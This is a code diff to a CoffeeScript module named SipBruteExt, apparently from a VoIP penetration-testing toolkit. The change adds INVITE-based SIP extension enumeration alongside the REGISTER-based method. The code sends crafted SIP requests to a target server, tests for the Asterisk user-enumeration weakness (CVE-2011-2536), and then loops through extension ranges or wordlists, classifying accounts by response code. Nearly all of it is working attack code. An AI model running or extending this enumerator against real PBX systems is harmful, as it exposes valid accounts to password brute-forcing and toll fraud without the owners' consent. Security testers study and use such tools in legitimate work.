@@ -37,36 +37,45 @@ fs = require "fs"
 exports.SipBruteExt =
 class SipBruteExt
 
-	printIsVuln = (isVuln) ->
-		if isVuln
+	printIsVuln = (vuln) ->
+		if vuln
 			Printer.highlight "\nThe target could be vulnerable to this vector\n"
 		else
 			Printer.highlight "\nThe target seems NOT to be vulnerable to this vector\n"
 
 
-	# It gets the fingerprint and print it with the rest of the outpupt.
-	parseReply = (msg, testExt) ->
-		# Response parsing.
-		code = Parser.parseCode msg
-		switch code
-			when "401", "407"
-				Printer.printEnum testExt, "Auth"
-			when "200"
-				Printer.printEnum testExt, "Open"
-			else
-				Printer.highlight "Last tested (not valid) extension "
-				Printer.normal "\"#{testExt}\"\n"
-				Printer.removeCursor()
-
-
 	oneEnum = (target, port, path, srcHost, transport, type, testExt) ->
 		lport = Utils.randomPort()
 		msgObj = new SipMessage type, "", target, port, srcHost, lport, testExt, "", transport, "", "", "", false, "", "", "", "", "", ""
+
 		msgSend = (String) msgObj.create()
 		conn = new AsteroidsConn target, port, path, transport, lport
+		firstResponse = true
 					
 		conn.on "newMessage", (stream) ->
-			parseReply stream, testExt
+			# TODO: We need to be more polited here, an ACK and BYE is needed
+			# to avoid loops.
+			if firstResponse
+				firstResponse = false	
+				code = Parser.parseCode stream
+				if type is "REGISTER"
+					switch code
+						when "401", "407"
+							Printer.printEnum testExt, "Auth"
+						when "200"
+							Printer.printEnum testExt, "Open"
+						else
+							Printer.highlight "Last tested (not valid) extension "
+							Printer.normal "\"#{testExt}\"\n"
+							Printer.removeCursor()
+				else
+					switch code
+						when "401"
+							Printer.printEnum testExt, ""
+						else
+							Printer.highlight "Last tested (not valid) extension "
+							Printer.normal "\"#{testExt}\"\n"
+							Printer.removeCursor()
 
 		conn.on "error", (error) ->
 			Printer.error "SipBruteExt: #{error}"
@@ -74,54 +83,79 @@ class SipBruteExt
 		conn.send msgSend
 
 
+	doEnum = (target, port, path, srcHost, transport, type, rangeExt, delay) ->
+		# Extension range.
+		if (Grammar.extRangeRE.exec rangeExt)
+			rangeExtParsed = Parser.parseExtRange rangeExt
+			doLoopNum = (i) =>
+				setTimeout(=>
+					oneEnum target, port, path, srcHost, transport, type, i
+					if i < rangeExtParsed.maxExt
+						doLoopNum(parseInt(i, 10) + 1)
+				,delay);
+			doLoopNum rangeExtParsed.minExt
+		# File with extensions.
+		else
+			if (Grammar.fileRE.exec rangeExt)
+				fs.readFile rangeExt, (err, data) ->
+					if err
+						Printer.error "sipBruteExt: #{err}"
+					else
+						extensions = data
+						splitData = data.toString().split("\n")
+						doLoopString = (i) =>
+							setTimeout(=>
+								oneEnum target, port, path, srcHost, transport, type, splitData[i]
+								if i < splitData.length - 1
+									doLoopString(i + 1)
+							,delay);
+						doLoopString 0
+			else
+				oneEnum target, port, path, srcHost, transport, type, rangeExt
+
+
 	@run = (target, port, path, srcHost, transport, type, rangeExt, delay) ->
 
 		# Needed to work with Node module net.isIPv6 function.
 		if (/:/.test target)
 			target = Utils.normalize6 target
+
 		# This extension ("olakase") is impossible to exist.
 		lport = Utils.randomPort()
-		# First request to see if the server could be vulnerable.
+		# First request to see if the server could be vulnerable
 		msgObj = new SipMessage type, "", target, port, srcHost, lport, "olakease", "", transport, "", "", "", false, "", "", "", "", "", ""
 		msgSend = (String) msgObj.create()
 		conn = new AsteroidsConn target, port, path, transport, lport
 		conn.send msgSend
+		goodResponse = false
 		
 		conn.on "newMessage", (stream) ->
 			code = Parser.parseCode(stream)
 			# First request parsing.
-			if code in ["401","407"]
-				printIsVuln false
-			else if code is "404"
-				printIsVuln true
-				# Extension range.
-				if (Grammar.extRangeRE.exec rangeExt)
-					rangeExtParsed = Parser.parseExtRange rangeExt
-					doLoopNum = (i) =>
-						setTimeout(=>
-							oneEnum target, port, path, srcHost, transport, type, i
-							if i < rangeExtParsed.maxExt
-								doLoopNum(parseInt(i, 10) + 1)
-						,delay);
-					doLoopNum rangeExtParsed.minExt
-				# File with extensions.
-				else
-					if (Grammar.fileRE.exec rangeExt)
-						fs.readFile rangeExt, (err, data) ->
-							if err
-								Printer.error "sipBruteExt: #{err}"
-							else
-								extensions = data
-								splitData = data.toString().split("\n")
-								doLoopString = (i) =>
-									setTimeout(=>
-										oneEnum target, port, path, srcHost, transport, type, splitData[i]
-										if i < splitData.length - 1
-											doLoopString(i + 1)
-									,delay);
-								doLoopString 0
-					else
-						oneEnum target, port, path, srcHost, transport, type, rangeExt
-						
+			if not goodResponse
+				if type is "REGISTER"
+					# CVE-2011-2536, it works if the server has alwaysauthreject=no,
+					# which is the default in old Asterisk versions.
+					# http://downloads.asterisk.org/pub/security/AST-2009-003.html
+					# http://downloads.asterisk.org/pub/security/AST-2011-011.html
+					if code in ["401","407"]
+						printIsVuln false
+						goodResponse = true
+					else 
+						if code is "404"
+							goodResponse = true
+							printIsVuln true
+							doEnum target, port, path, srcHost, transport, type, rangeExt, delay
+				else # if INVITE
+					# No CVE, some links:
+					# http://packetstormsecurity.com/search/?q=francesco+tornieri+SIP+User+Enumeration&s=files
+					# Still not implemented: http://packetstormsecurity.com/files/100515/Asterisk-1.4.x-1.6.x-Username-Enumeration.html
+					if code in ["100","407","484"]
+						goodResponse = true
+						printIsVuln true
+						doEnum target, port, path, srcHost, transport, type, rangeExt, delay
+					# else
+					# 	printIsVuln false
+
 		conn.on 'error', (error) ->
 			Printer.error "SipBruteExt: #{error}"
